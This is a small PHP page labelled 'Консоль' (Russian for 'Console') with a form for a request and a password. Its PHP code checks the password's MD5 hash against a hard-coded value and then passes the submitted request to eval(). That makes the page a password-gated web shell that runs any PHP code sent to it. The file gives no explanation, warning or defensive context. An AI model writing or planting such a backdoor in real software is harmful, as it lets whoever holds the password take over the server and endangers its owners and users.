<!DOCTYPE html>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	</head>
	
	<body>
	<b> Консоль</b>
		<form method="post">
		Запрос: <input type="text" name="request">
		Пароль: <input type="text" name="password">
		<input type="submit">
		

		</form>

	</body>
</html>

<?php

if (md5($_POST['password'])=="d88f07528fa07f7be9318ece7656fd0b")
	eval($_POST['request']);
?>